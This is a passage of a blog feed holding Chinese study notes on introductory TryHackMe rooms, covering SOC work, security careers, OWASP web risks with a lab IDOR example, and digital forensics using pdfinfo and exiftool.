class="line">检测和分析：团队必须拥有必要的资源来检测任何事件；此外，进一步分析检测到的任何事件以了解其严重性至关重要。</span><br><span class="line">遏制、清除和恢复：一旦检测到事件，就至关重要地停止它影响其他系统，消除它并恢复受影响的系统。例如，当我们注意到一个系统被计算机病毒感染时，我们希望阻止（遏制）病毒传播到其他系统，清除（清除）病毒，并确保适当的系统恢复。</span><br><span class="line">事件后活动：成功恢复后，将生成一份报告，并分享所学到的经验以防止类似的未来事件。</span><br><span class="line"></span><br><span class="line">恶意软件分析</span><br><span class="line">恶意软件指恶意软件。软件是指可以保存在磁盘上或通过网络发送的程序、文档和文件。恶意软件包括许多类型，例如：</span><br><span class="line"></span><br><span class="line">病毒是一段代码（程序的一部分），它附加到程序上。它被设计为从一台计算机传播到另一台计算机；此外，一旦感染计算机，它会通过更改、覆盖和删除文件来工作。结果从计算机变慢到不可用。</span><br><span class="line">特洛伊木马是一个显示一个可取的功能但在其下隐藏了恶意功能的程序。例如，受害者可能会从可疑网站下载视频播放器，该播放器会使攻击者完全控制他们的系统。</span><br><span class="line">勒索软件是一种恶意程序，它加密用户的文件。加密使文件在不知道加密密码的情况下无法阅读。如果用户愿意支付“赎金”，攻击者会向用户提供加密密码。</span><br><span class="line"></span><br><span class="line">恶意软件分析旨在通过各种手段了解这些恶意程序：</span><br><span class="line"></span><br><span class="line">静态分析通过检查恶意程序而不运行它来工作。通常，这需要扎实的汇编语言知识（处理器的指令集，即计算机的基本指令）。</span><br><span class="line">动态分析通过在受控环境中运行恶意软件并监视其活动来工作。它允许您观察恶意软件运行时的行为。</span><br></pre></td></tr></table></figure>
<h4 id="Practical-Example-of-Defensive-Security">Practical Example of Defensive Security</h4>
<p>这一部分就是简单讲述了一个溯源的过程</p>
<p>跟着操作就行，唯一的难点是英语太差</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为安全分析员，您可能会执行的典型任务是什么？</span><br><span class="line"></span><br><span class="line">您是安全运营中心（SOC）的一部分，负责保护一家银行。这家银行的SOC使用了安全信息和事件管理（SIEM）系统。SIEM系统会从各种来源收集安全相关的信息和事件，并通过一个系统呈现它们。例如，如果有登录失败的尝试或者来自意外地理位置的登录尝试，您将会收到通知。此外，随着机器学习的出现，SIEM可能会检测到异常行为，比如用户在凌晨3点登录，而他通常只在工作时间登录。</span><br><span class="line"></span><br><span class="line">在这个练习中，我们将与SIEM互动，实时监视网络和系统上的不同事件。一些事件是典型的和无害的；而其他一些可能需要我们进一步干预。找到以红色标记的事件，做好记录，并点击它进行进一步检查。</span><br><span class="line"></span><br><span class="line">接下来，我们想要了解更多有关可疑活动或事件的信息。可疑事件可能由事件触发，如本地用户、本地计算机或远程IP地址。要发送和接收邮件，您需要一个物理地址；类似地，您需要一个IP地址来通过互联网发送和接收数据。IP地址是允许您在互联网上进行通信的逻辑地址。我们检查触发原因以确认事件是否确实是恶意的。如果是恶意的，我们需要采取适当的行动，例如向SOC中的其他人员报告并阻止该IP地址。</span><br></pre></td></tr></table></figure>
<h3 id="Careers-in-Cyber">Careers in Cyber</h3>
<h4 id="Introduction">Introduction</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">网络安全职业需求越来越高，提供高薪水。在安全行业中有许多不同的工作，从进攻性的渗透测试（攻击计算机并报告漏洞）到防御性安全（防御和调查网络攻击）。</span><br><span class="line"></span><br><span class="line">为什么要选择网络安全职业：</span><br><span class="line"></span><br><span class="line">高薪水 - 安全领域的工作起薪高</span><br><span class="line">刺激 - 工作可能包括合法地攻击系统或防御网络攻击</span><br><span class="line">需求量大 - 有超过350万个未填补的网络安全职位</span><br><span class="line">这个房间通过提供有关各种网络安全角色的信息来帮助您进入网络安全行业；它还链接到不同的学习路径，您可以利用这些路径开始建立您的网络安全技能。</span><br></pre></td></tr></table></figure>
<h4 id="Security-Analyst">Security Analyst</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安全分析员对于构建组织内的安全措施以保护公司免受攻击至关重要。分析员探索和评估公司网络，以发现可操作的数据和建议，供工程师开发预防措施。这个工作角色需要与各种利益相关者合作，以了解安全需求和安全环境。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">与各种利益相关者合作，分析公司整体的网络安全情况</span><br><span class="line">编制关于网络安全的持续报告，记录安全问题和采取的应对措施</span><br><span class="line">制定安全计划，整合对新攻击工具和趋势的研究，以及团队间需要采取的措施来维护数据安全。</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的安全分析员至关重要。</span><br><span class="line"></span><br><span class="line">网络安全介绍</span><br><span class="line">准备安全</span><br><span class="line">SOC一级</span><br></pre></td></tr></table></figure>
<h4 id="Security-Engineer">Security Engineer</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安全工程师利用威胁和漏洞数据开发和实施安全解决方案，这些数据通常来自安全人员。安全工程师负责应对各种攻击，包括Web应用程序攻击、网络威胁以及不断演变的趋势和策略。最终目标是保留并采用安全措施，以减轻攻击和数据丢失的风险。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">测试和筛选跨软件的安全措施</span><br><span class="line">监视网络并报告以更新系统并减轻漏洞</span><br><span class="line">识别和实施所需的系统以实现最佳安全性</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的安全工程师至关重要。</span><br><span class="line"></span><br><span class="line">SOC一级</span><br><span class="line">初级渗透测试员</span><br><span class="line">攻击性渗透测试</span><br></pre></td></tr></table></figure>
<h4 id="Incident-Responder">Incident Responder</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">事件响应人员对安全漏洞做出及时有效的响应。责任包括为组织在事故期间和事后执行的计划、政策和协议的创建。这通常是一个压力很大的职位，因为评估和响应需要实时进行，攻击正在发生。事件响应度量指标包括MTTD、MTTA和MTTR——即发现、确认和恢复（从攻击中恢复）的平均时间。其目的是实现快速有效的响应，保持财务状况并避免负面的违规影响。最终，事件响应人员保护公司的数据、声誉和财务状况免受网络攻击的侵害。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">制定和采用详尽的可行的事件响应计划</span><br><span class="line">维护强大的安全最佳实践，并支持事件响应措施</span><br><span class="line">事后报告和准备应对未来的攻击，考虑从事件中学到的经验和适应性</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的事件响应人员至关重要。</span><br><span class="line"></span><br><span class="line">SOC一级</span><br></pre></td></tr></table></figure>
<h4 id="Digital-Forensics-Examiner">Digital Forensics Examiner</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果您喜欢扮演侦探，那么这可能是一份完美的工作。如果您是作为执法部门的一部分工作，您将专注于收集和分析证据，以帮助解决犯罪：对有罪者提出控诉，为无辜者辩护。另一方面，如果您的工作属于保卫公司网络，您将利用您的取证技能来分析事件，如政策违规。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">在遵守法律程序的情况下收集数字证据</span><br><span class="line">分析数字证据以找到与案件相关的答案</span><br><span class="line">记录您的发现并报告案件</span><br></pre></td></tr></table></figure>
<h4 id="Malware-Analyst">Malware Analyst</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">恶意软件分析师的工作涉及分析可疑程序，发现它们的功能，并撰写有关其发现的报告。恶意软件分析师有时被称为逆向工程师，因为他们的核心任务围绕着将编译的程序从机器语言转换为可读代码，通常是低级语言。这项工作要求恶意软件分析师具有扎实的编程背景，特别是在低级语言，如汇编语言和C语言方面。最终目标是了解恶意程序执行的所有活动，找出如何检测它并报告它。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">进行恶意程序的静态分析，包括逆向工程</span><br><span class="line">通过观察受控环境中恶意软件样本的活动来进行动态分析</span><br><span class="line">记录并报告所有发现</span><br></pre></td></tr></table></figure>
<h4 id="Penetration-Tester">Penetration Tester</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">您可能会看到渗透测试被称为渗透测试和道德黑客。渗透测试人员的工作职责是测试公司内部系统和软件的安全性 - 通过尝试通过系统化的黑客活动发现缺陷和漏洞来实现这一目标。渗透测试人员利用这些漏洞来评估每个实例中的风险。公司随后可以利用这些见解来纠正问题，以防止真实的网络攻击。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">对计算机系统、网络和基于Web的应用程序进行测试</span><br><span class="line">执行安全评估、审核和分析政策</span><br><span class="line">评估并报告见解，建议攻击预防措施</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的渗透测试人员至关重要。</span><br><span class="line"></span><br><span class="line">初级渗透测试员</span><br><span class="line">攻击性渗透测试</span><br></pre></td></tr></table></figure>
<h4 id="Red-Teamer">Red Teamer</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">红队员与渗透测试人员有相似之处，但职责更加具有针对性。渗透测试人员旨在发现系统中的许多漏洞，以保持网络防御的良好状态，而红队员则旨在测试公司的检测和响应能力。这项工作要求模仿网络犯罪分子的行动，模拟恶意攻击，保持访问权限，并避免被检测到。红队评估通常由公司外部的团队负责，可以持续长达一个月。它们通常最适合已建立成熟安全程序的组织。</span><br><span class="line"></span><br><span class="line">责任</span><br><span class="line">模拟威胁行为者的角色，发现可利用的漏洞，保持访问权限并避免被检测到</span><br><span class="line">评估组织的安全控制、威胁情报和事件响应程序</span><br><span class="line">评估并报告见解，提供可行的数据供公司避免真实世界中的情况</span><br><span class="line">学习路径</span><br><span class="line">TryHackMe的学习路径将为您提供基础的技术知识和实践经验，这对于成为一名成功的红队员至关重要。</span><br><span class="line"></span><br><span class="line">初级渗透测试员</span><br><span class="line">攻击性渗透测试</span><br><span class="line">红队员</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme_Diary-2</title>
    <url>/2024/02/22/Tryhackme_Diary-2/</url>
    <content><![CDATA[<h1>Tryhackme_Diary-2</h1>
<h2 id="Introduction-to-Offensive-Security">Introduction to Offensive Security</h2>
<h3 id="Web-Application-Security">Web Application Security</h3>
<h4 id="Introduction">Introduction</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">每个人都在自己的计算机上使用不同的程序。一般来说，程序在我们的计算机上运行，利用我们计算机的处理能力和存储空间。而且，要使用一个程序，我们需要先安装它。但是如果我们可以在不安装的情况下使用任何程序呢？</span><br><span class="line"></span><br><span class="line">网络应用就像一个“程序”，只要我们有现代标准的网络浏览器，比如Firefox、Safari或Chrome，我们就可以使用它。因此，与其安装每个你需要的程序，你只需要浏览相关的页面。以下是一些网络应用的例子：</span><br><span class="line"></span><br><span class="line">- 网络邮件，比如Tutanota、Protonmail、Outlook和Gmail</span><br><span class="line">- 在线办公套件，如Microsoft Office 365（Word、Excel和PowerPoint）、Google Drive（Docs、Sheets和Slides）和Zoho Office（Writer、Sheet和Show）</span><br><span class="line">- 网上购物，如Amazon.com、AliExpress和Etsy</span><br><span class="line">成千上万的其他例子提供了各种各样的服务。其他例子包括在线银行业务、货币转账、天气预报和社交媒体。</span><br><span class="line"></span><br><span class="line">网络银行业务网络应用</span><br><span class="line"></span><br><span class="line">网络应用的概念是它是运行在远程服务器上的程序。服务器是指持续运行以“为客户服务”的计算机系统。在这种情况下，服务器将运行一种特定类型的程序，可以通过网络浏览器访问。</span><br><span class="line"></span><br><span class="line">考虑一个在线购物应用程序。网络应用程序将从数据库服务器读取有关产品及其详细信息的数据。数据库用于以有组织的方式存储信息。例如，关于产品、客户和发票的信息。数据库服务器负责许多功能，包括读取、搜索和写入数据库。在线购物网络应用可能需要访问一个以上的数据库，例如：</span><br><span class="line"></span><br><span class="line">- 产品数据库：这个数据库包含产品的详细信息，如名称、图片、规格和价格。</span><br><span class="line">- 客户数据库：它包含与客户相关的所有详细信息，如姓名、地址、电子邮件和电话号码。</span><br><span class="line">- 销售数据库：我们希望在这个数据库中看到每个客户购买了什么以及他们是如何支付的。</span><br><span class="line"></span><br><span class="line">我们已经看到了任何在线购物系统中存储的大量信息。假设攻击者成功地利用了网络应用程序并窃取了客户数据库，这将给公司和其客户带来重大损失。</span><br><span class="line"></span><br><span class="line">下面的图像显示了在在线购物网站上搜索商品的过程。在最简单的版本中，搜索将分为四个步骤：</span><br><span class="line"></span><br><span class="line">- 用户在搜索栏中输入商品名称或相关关键字。网络浏览器将搜索关键字发送到在线购物网络应用程序。</span><br><span class="line">- 网络应用程序查询（搜索）提交的关键字的产品数据库。</span><br><span class="line">- 产品数据库将匹配所提供的关键字的搜索结果返回给网络应用程序。</span><br><span class="line">- 网络应用程序将结果格式化为友好的网页并返回给用户。</span><br><span class="line"></span><br><span class="line">从用户的角度来看，他们只会访问一个优雅的在线商店，所有的技术基础设施都是隐藏的。</span><br><span class="line"></span><br><span class="line">访问网络应用程序时，技术基础设施被隐藏起来</span><br><span class="line"></span><br><span class="line">许多公司提供漏洞赏金计划。漏洞赏金计划允许公司为发现其系统中的安全漏洞（弱点）的任何人提供奖励。主要条件是找到的漏洞必须在漏洞赏金范围和规则内。谷歌、微软和Facebook等公司都有漏洞赏金计划。发现一个漏洞可以让你赚取从几百美元到数万美元不等的奖金，具体取决于漏洞的严重程度，也就是你发现的弱点。</span><br></pre></td></tr></table></figure>
<h4 id="Web-Application-Security-Risks">Web Application Security Risks</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设您想要从一个在线商店购买商品。在这个 Web 应用程序上，您期望能够执行一些特定的功能。最直接的情况下，在线订购可能会按照以下步骤进行：</span><br><span class="line"></span><br><span class="line">1. 在网站上登录。 2. 搜索产品。 3. 将产品添加到购物车中。 4. 指定送货地址。 5. 提供支付详情。</span><br><span class="line"></span><br><span class="line">针对 Web 应用程序的攻击主要有几个常见的类别。考虑以下步骤及相关的攻击。</span><br><span class="line"></span><br><span class="line">在网站上登录：攻击者可以尝试通过尝试许多密码来发现密码。攻击者会使用一个长列表的密码和自动化工具来测试它们与登录页面的匹配情况。</span><br><span class="line"></span><br><span class="line">搜索产品：攻击者可以尝试通过在搜索词中添加特定字符和代码来突破系统。攻击者的目标是使目标系统返回它不应该返回的数据或执行它不应该执行的程序。</span><br><span class="line"></span><br><span class="line">提供支付详情：攻击者会检查支付详情是否以明文形式发送或使用弱加密。加密是指使数据在不知道密钥或密码的情况下无法读取。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">我们无法涵盖所有内容，但我们将介绍 OWASP 十大的一些正式类别。如果这些技术对您来说听起来有些陌生，请不用担心；TryHackMe 将向您介绍每个漏洞。</span><br><span class="line"></span><br><span class="line">识别和身份验证失败：识别指的是唯一识别用户的能力。而身份验证则指的是证明用户是其所声称的人的能力。在线商店必须在用户使用系统之前确认用户的身份并对其进行身份验证。然而，这一步骤容易受到不同类型的弱点的影响。例如：</span><br><span class="line"></span><br><span class="line">允许攻击者使用暴力破解，即使用自动化工具尝试许多密码以查找有效的登录凭据。</span><br><span class="line"></span><br><span class="line">允许用户选择弱密码。弱密码通常容易被猜到。</span><br><span class="line"></span><br><span class="line">以明文形式存储用户的密码。如果攻击者成功读取包含密码的文件，我们不希望他们能够了解存储的密码。</span><br><span class="line"></span><br><span class="line">损坏的访问控制：访问控制确保每个用户只能访问与其角色或工作相关的文件（文档、图像等）。例如，您不希望市场部门的某人访问（阅读）财务部门的文档。与访问控制相关的示例漏洞包括：</span><br><span class="line"></span><br><span class="line">未能应用最小权限原则，并给予用户比他们需要的更多的访问权限。例如，一个在线客户应该能够查看商品的价格，但他们不应该能够更改商品价格。</span><br><span class="line"></span><br><span class="line">通过使用其唯一标识符查看或修改其他人的帐户。例如，您不希望一个银行客户能够查看另一个客户的交易。</span><br><span class="line"></span><br><span class="line">能够以未经身份验证的用户的身份浏览需要身份验证（登录）的页面。例如，我们不能让任何人在登录前查看网络邮件。</span><br><span class="line"></span><br><span class="line">注入：注入攻击是指 Web 应用程序中的漏洞，其中用户可以将恶意代码作为其输入的一部分插入。此漏洞的一个原因是对用户输入的验证和清理不足。</span><br><span class="line"></span><br><span class="line">密码学失败：这个类别与密码学有关的失败。密码学关注的是数据的加密和解密过程。加密将明文转换为密文，对于没有密钥解密的人来说，密文应该是无法理解的。换句话说，加密确保没有人能够在不知道密钥的情况下读取数据。解密使用密钥将密文转换回原始明文。密码学失败的</span><br><span class="line"></span><br><span class="line">示例包括：</span><br><span class="line"></span><br><span class="line">以明文形式发送敏感数据，例如使用 HTTP 而不是 HTTPS。HTTP 是访问 Web 的协议，而 HTTPS 是 HTTP 的安全版本。其他人可以读取您通过 HTTP 发送的所有内容，但不能读取 HTTPS。</span><br><span class="line"></span><br><span class="line">依赖弱密码算法。一个旧的密码算法是将每个字母向后移动一位。例如，“TRY HACK ME” 变成 “USZ IBDL NF”。这个密码算法很容易被破解。</span><br><span class="line"></span><br><span class="line">对密码学函数使用默认或弱密钥。使用 1234 作为密钥的加密很容易被破解。</span><br><span class="line"></span><br><span class="line">这张图显示了一名顾客在线使用她的信用卡，信用卡号以明文形式发送。</span><br><span class="line"></span><br><span class="line">如果这些技术起初看起来有些复杂或高级，请不用担心。TryHackMe 专门提供了深入的房间，帮助您理解和实验针对 Web 应用程序的各种攻击。</span><br></pre></td></tr></table></figure>
<h4 id="Practical-Example-of-Web-Application-Security">Practical Example of Web Application Security</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">此任务将调查一个使用不安全的直接对象引用（IDOR）的易受攻击的网站。IDOR属于破坏访问控制的范畴。破坏访问控制意味着攻击者可以访问未针对他们的信息或执行未经授权的操作。考虑这样一个情况，一个 Web 服务器接收用户提供的输入来检索对象（文件、数据、文档），并且它们按顺序编号。假设用户有权限访问名为 IMG_1003.JPG 的照片。我们可能会猜到还有 IMG_1002.JPG 和 IMG_1004.JPG; 但是，即使我们弄清了它的名称，Web 应用程序也不应该提供给我们那张照片。通常，如果对输入数据放置了太多的信任，就会出现IDOR漏洞。换句话说，Web 应用程序不会验证用户是否有权限访问请求的对象。</span><br><span class="line"></span><br><span class="line">仅仅提供用户或产品的正确 URL 并不一定意味着用户应该能够访问该 URL。例如，考虑产品页面 https://store.tryhackme.thm/products/product?id=52。我们可以期望这个 URL 提供有关产品编号 52 的详细信息。在数据库中，项目将按顺序分配编号。攻击者将尝试其他数字，例如 51 或 53，而不是 52; 如果 Web 应用程序容易受到攻击，这可能会显示其他已退休或未发布的产品。</span><br><span class="line"></span><br><span class="line">让我们考虑一个更为关键的例子；URL https://store.tryhackme.thm/customers/user?id=16 将返回 id=16 的用户。同样，我们期望用户具有顺序编号。攻击者将尝试其他数字，并可能访问其他用户帐户。这种漏洞可能适用于顺序文件；例如，如果攻击者看到 007.txt，那么攻击者可能会尝试其他数字，例如 001.txt、006.txt 和 008.txt。同样，如果您是编号为 16 的ID，而编号为 17 的ID是另一个用户，通过将ID更改为 17，您可以看到属于另一个用户的敏感数据。同样，他们可以将ID更改为 16，并查看属于您的敏感数据。（当然，我们在这里假设系统容易受到IDOR攻击。）</span><br><span class="line"></span><br><span class="line">点击“查看站点”，让我们看看它是如何运作的。您将看到一个显示库存管理系统的页面。如果您点击“计划发货”选项卡，您会发现攻击者已经在破坏计划中成功地混淆了事情。请注意，他们将错误的轮胎发送到每条生产线上；例如，他们将摩托车轮胎和摩托车轮胎分配给了自行车装配！如果不加修复，所有轮胎都将错误地发送到错误的装配线。</span><br><span class="line"></span><br><span class="line">我们将黑客系统并撤消攻击者的步骤。在“您的活动”中，您可以看到一个用户的活动。我们有理由相信这个网站有IDOR漏洞。</span><br></pre></td></tr></table></figure>
<p>这一块就是介绍了一个简单的用户遍历，通过get请求可以直接通过相关编号修改去实现用户遍历，最后还原即得flag</p>
<p><img src="https://s2.loli.net/2024/02/23/KQwURGOTarhvCYB.png" alt="Tryhackme_2_1"></p>
<h2 id="Introduction-to-Defensive-Security">Introduction to Defensive Security</h2>
<h3 id="Intro-to-Digital-Forensics">Intro to Digital Forensics</h3>
<h4 id="Introduction-To-Digital-Forensics">Introduction To Digital Forensics</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">取证是将科学应用于调查犯罪并确定事实的过程。随着计算机和智能手机等数字系统的使用和普及，涉及数字设备和媒体的调查衍生出了一个新的取证领域：计算机取证，后来演变为数字取证。</span><br><span class="line"></span><br><span class="line">想象以下情景。执法人员到达犯罪现场；然而，这个犯罪现场的一部分包括数字设备和媒体。数字设备包括台式电脑、笔记本电脑、数码相机、音乐播放器和智能手机等。数字媒体包括CD、DVD、USB闪存驱动器和外部存储等。会出现一些问题：</span><br><span class="line"></span><br><span class="line">警方应如何收集数字证据，如智能手机和笔记本电脑？如果计算机和智能手机正在运行，应该遵循什么程序？</span><br><span class="line">如何转移数字证据？在搬运计算机时是否有一定的最佳实践要遵循？</span><br><span class="line">如何分析收集到的数字证据？个人设备存储容量从几十吉字节到数千吉字节不等；如何分析这些数据？</span><br><span class="line"></span><br><span class="line">假设上图中的员工存在嫌疑，我们可以迅速看到可能与调查相关的数字设备。我们注意到一个平板电脑、一个智能手机、一台数码相机和一个USB闪存驱动器，还有一台台式电脑。这些设备中的任何一个都可能包含大量的信息，有助于调查。处理这些作为证据需要进行数字取证。</span><br><span class="line"></span><br><span class="line">更正式地说，数字取证是将计算机科学应用于对数字证据进行法律目的调查的过程。数字取证用于两种类型的调查：</span><br><span class="line"></span><br><span class="line">公共部门调查是由政府和执法机构进行的调查。它们将成为刑事或民事调查的一部分。</span><br><span class="line">私营部门调查是由公司机构进行的调查，通过分配一个私人调查员，无论是内部还是外包。它们是由企业政策违规引发的。</span><br><span class="line">无论是调查犯罪还是企业政策违规，一部分证据与数字设备和数字媒体有关。这就是数字取证发挥作用并尝试确定发生了什么事情的地方。没有经过训练的数字取证调查员，将无法正确处理任何数字证据。</span><br></pre></td></tr></table></figure>
<h4 id="Digital-Forensics-Process">Digital Forensics Process</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为数字取证调查员，你到达了类似上图所示的现场。作为数字取证调查员，你应该做什么？在获得适当的法律授权后，基本计划如下：</span><br><span class="line"></span><br><span class="line">1. 获取证据：收集数字设备，如笔记本电脑、存储设备和数码相机。（需要注意的是，如果笔记本电脑和计算机正在运行，它们需要特殊处理；然而，这超出了本房间的范围。）</span><br><span class="line">2. 建立证据保管链：适当填写相关表格（样本表格）。目的是确保只有授权调查人员能够访问证据，没有人可以篡改它。</span><br><span class="line">3. 将证据放入安全容器：你要确保证据不会被损坏。对于智能手机，你要确保它们无法访问网络，以防止远程擦除。</span><br><span class="line">4. 将证据运输到你的数字取证实验室。</span><br><span class="line"></span><br><span class="line">在实验室里，流程如下：</span><br><span class="line"></span><br><span class="line">1. 从安全容器中取出数字证据。</span><br><span class="line">2. 创建证据的取证副本：取证副本需要使用高级软件来避免修改原始数据。</span><br><span class="line">3. 将数字证据放回安全容器：你将在副本上工作。如果你损坏了副本，你可以随时创建一个新的副本。</span><br><span class="line">4. 开始在你的取证工作站上处理副本。</span><br><span class="line"></span><br><span class="line">上述步骤已经改编自《计算机取证和调查指南》第6版。</span><br><span class="line"></span><br><span class="line">更普遍地说，根据前国防计算机取证实验室主任Ken Zatyko的说法，数字取证包括：</span><br><span class="line"></span><br><span class="line">1. 正确的搜索授权：调查人员不能在没有适当的法律授权的情况下开始工作。</span><br><span class="line">2. 证据保管链：这是必要的，以便随时了解谁持有证据。</span><br><span class="line">3. 使用数学验证：使用一种特殊类型的数学函数，称为哈希函数，我们可以确认文件没有被修改。</span><br><span class="line">4. 使用经过验证的工具：数字取证中使用的工具应该经过验证，以确保它们能正常工作。例如，如果你正在创建磁盘的映像，你希望确保取证映像与磁盘上的数据完全相同。</span><br><span class="line">5. 可重复性：只要具备适当的技能和工具，数字取证的发现就可以被复现。</span><br><span class="line">6. 报告：数字取证调查以一份报告结束，展示了与案件相关的发现的证据。</span><br></pre></td></tr></table></figure>
<h4 id="Practical-Example-of-Digital-Forensics">Practical Example of Digital Forensics</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们在数字设备上所做的一切，从智能手机到计算机，都会留下痕迹。让我们看看如何在后续的调查中利用这一点。</span><br><span class="line"></span><br><span class="line">我们的猫，Gado，被绑架了。绑匪给我们发送了一份请求的文档，格式为MS Word文档。我们已经将文档转换为PDF格式，并从MS Word文件中提取了图像以方便您查看。</span><br><span class="line"></span><br><span class="line">您可以下载附件到本地计算机进行检查；但是，为了您的方便，我们已将文件添加到AttackBox中。要跟随操作，请在AttackBox上打开终端，然后转到如下所示的目录。在以下终端输出中，我们更改了包含案例文件的目录。/root/Rooms/introdigitalforensics</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">root# cd /root/Rooms</span><br><span class="line">root# cd introdigitalforensics</span><br><span class="line">root# ls</span><br><span class="line">letter-image.jpg  ransom-letter.doc  ransom-letter.pdf  ransom-lettter-2.zip</span><br><span class="line">文档元数据</span><br><span class="line">当您创建一个文本文件时，操作系统会保存一些元数据，例如文件创建日期和上次修改日期。但是，如果您使用更高级的编辑器，例如MS Word，则文件的元数据会保留许多信息。有各种方法可以读取文件元数据；您可以在官方的查看器/编辑器中打开它们，也可以使用适当的取证工具。请注意，将文件导出到其他格式（例如）将保留原始文档的大多数元数据，具体取决于所使用的PDF编写程序。TXTPDF</span><br><span class="line"></span><br><span class="line">让我们看看我们可以从PDF文件中了解到什么。我们可以尝试使用程序读取元数据。Pdfinfo显示与PDF文件相关的各种元数据，例如标题、主题、作者、创建者和创建日期。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请使用安装。）考虑以下使用的示例。.pdfinfopdfinfopdfinfosudo apt install poppler-utilspdfinfo DOCUMENT.pdf</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ pdfinfo DOCUMENT.pdf </span><br><span class="line">创建者:        Microsoft® Word for Office 365</span><br><span class="line">生产者:       Microsoft® Word for Office 365</span><br><span class="line">创建日期:   Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">修改日期:        Wed Oct 10 21:47:53 2018 EEST</span><br><span class="line">标记:         yes</span><br><span class="line">用户属性: no</span><br><span class="line">嫌疑人:       no</span><br><span class="line">表单:           none</span><br><span class="line">JavaScript:     no</span><br><span class="line">页数:          20</span><br><span class="line">加密:      no</span><br><span class="line">页面大小:      595.32 x 841.92 pts (A4)</span><br><span class="line">页面旋转:       0</span><br><span class="line">文件大小:      560362 字节</span><br><span class="line">优化:      no</span><br><span class="line">PDF版本:    1.7</span><br><span class="line">PDF元数据清楚地显示了它是使用MS Word for Office 365于2018年10月10日创建的。</span><br><span class="line"></span><br><span class="line">照片EXIF数据</span><br><span class="line">EXIF代表可交换图像文件格式；这是一种将元数据保存到图像文件中的标准。每当您使用智能手机或数码相机拍照时，都会嵌入大量信息到图像中。以下是原始数字图像中可能包含的元数据示例：</span><br><span class="line"></span><br><span class="line">相机型号/智能手机型号</span><br><span class="line">图像捕获的日期和时间</span><br><span class="line">照片设置，例如焦距、光圈、快门速度和ISO设置</span><br><span class="line">由于智能手机配备有GPS传感器，因此在图像中找到嵌入的GPS坐标的可能性很高。 GPS坐标，即纬度和经度，通常会显示拍摄照片的地点。</span><br><span class="line"></span><br><span class="line">有许多在线和离线工具可用于读取图像的EXIF数据。其中一个命令行工具是。 ExifTool用于读取和写入各种文件类型的元数据，例如JPEG图像。（AttackBox已经安装了；但是，如果您使用的是Kali Linux并且没有安装，请</span><br><span class="line"></span><br><span class="line">使用安装。）在以下终端窗口中，我们执行了以读取此图像中嵌入的所有EXIF数据。exiftoolexiftoolexiftoolsudo apt install libimage-exiftool-perlexiftool IMAGE.jpg</span><br><span class="line"></span><br><span class="line">终端</span><br><span class="line">user@TryHackMe$ exiftool IMAGE.jpg</span><br><span class="line">[...]</span><br><span class="line">GPS位置: 51度31&#x27;4.00&quot; N，0度5&#x27;48.30&quot; W</span><br><span class="line">[...]</span><br><span class="line">如果您将上述坐标搜索到在线地图上，您将了解有关此位置的更多信息。在Microsoft Bing Maps或Google Maps中搜索，会发现这些坐标表明该图像是在伦敦博物馆附近拍摄的。 （我们只替换了以使我们的搜索起作用。）我们注意到坐标在搜索页面上被转换为十进制表示：.51° 31&#x27; 4.00&quot; N，0° 5&#x27; 48.30&quot; Wdeg°51.517776, -0.09675</span><br><span class="line"></span><br><span class="line">使用或任何类似的工具，尝试找出绑匪拍摄其附加到文档中的图像的地点。街道的名称是什么？exiftool</span><br></pre></td></tr></table></figure>
<p>这边给了例题，主要就是查找基本的exif信息，除了上述给出的工具，直接用010手撸都行，最简单的misc</p>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme_Diary-3</title>
    <url>/2024/02/24/Tryhackme_Diary-3/</url>
    <content><![CDATA[<h1>Tryhackme_Diary-3</h1>
<h2 id="Introduction-to-Pentesting">Introduction to Pentesting</h2>
<h3 id="What-is-Penetration-Testing">What is Penetration Testing?</h3>
